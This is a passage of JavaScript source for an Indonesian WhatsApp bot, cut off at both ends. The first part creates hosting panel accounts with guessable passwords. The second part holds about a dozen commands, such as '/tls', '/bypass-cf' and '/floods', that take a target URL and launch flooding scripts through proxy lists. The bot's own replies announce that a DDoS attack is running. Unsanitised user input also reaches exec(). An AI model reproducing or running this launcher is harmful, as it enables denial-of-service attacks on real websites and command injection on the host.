        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 3gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/8gb': {
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "8024"
        let cpu = "200"
        let disk = "8024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 8gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/4gb': {
        if (!isReseller) {
          m.reply(mess.seller)
        }
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "4024"
        let cpu = "110"
        let disk = "4024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 8gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/5gb': {
        if (!isReseller) {
          m.reply(mess.seller)
        }
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "5024"
        let cpu = "130"
        let disk = "5024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 5gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/6gb': {
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "6024"
        let cpu = "150"
        let disk = "6024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 5gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break
      //=================================================//
      case '/7gb': {
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "7024"
        let cpu = "170"
        let disk = "7024"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - 7gb',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break

      //=================================================//
      case '/unli': {
        if (!isPrem) return replygw(ownerprem)
        let t = q.split(',');
        if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
        let username = t[0];
        let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
        let name = username
        let egg = global.eggsnya
        let loc = global.location
        let memo = "0"
        let cpu = "0"
        let disk = "0"
        let email = username + "qio@sweetrabit.ml"
        akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg"
        if (!u) return
        let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
        let password = username + '001'
        let f = await fetch(domain + "/api/application/users", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          },
          "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
          })
        })
        let data = await f.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes
        let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
          "method": "GET",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
          }
        })
        m.reply(`User ID: ${user.id}`)
        let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
        qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
        let data2 = await f2.json()
        let startup_cmd = data2.attributes.startup
        let f3 = await fetch(domain + "/api/application/servers", {
          "method": "POST",
          "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
          },
          "body": JSON.stringify({
            "name": name + ' - Unlimited',
            "description": 'Create with ' + botname,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
              "INST": "npm",
              "USER_UPLOAD": "0",
              "AUTO_UPDATE": "0",
              "CMD_RUN": "npm start"
            },
            "limits": {
              "memory": memo,
              "swap": 0,
              "disk": disk,
              "io": 500,
              "cpu": cpu
            },
            "feature_limits": {
              "databases": 5,
              "backups": 5,
              "allocations": 5
            },
            deploy: {
              locations: [parseInt(loc)],
              dedicated_ip: false,
              port_range: [],
            },
          })
        })
        let res = await f3.json()
        if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
        let server = res.attributes
        let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
      }
        break


      case '/eror': {
        if (!isMurbug) return replygw(ownerprem)
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/main ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break


      case '/enc':
        if (!isDeveloper) return m.reply('kamu bukan owner')
        if (!q) return m.reply(`Example ${prefix + command} const time = require('money')`)
        let meg = await obfus(q)
        m.reply(`${meg.result}`)
        break

      case '/mix': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/tls': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/tls-v2': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/kilua': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/tls-bypass': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/bypass-cf': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/tls-vip': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/floods': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/egao': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
          m.reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
          exec(`node ./lib/#-Alwaysaqioo/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
            if (err) return console.log(err.toString())
            if (stdout) return console.log(util.format(stdout))
          })
        } else {
          m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
        }
      }
        break

      case '/xchrome': {
        if (!isMurbug) return m.reply('kamu bukan owner')
        let url = q.split(" ")[0]
        let time = q.split(" ")[1]
        let thread = q.split(" ")[2]
        let rate = q.split(" ")[3]
        if (args.length === 4 && url && time && thread && rate) {
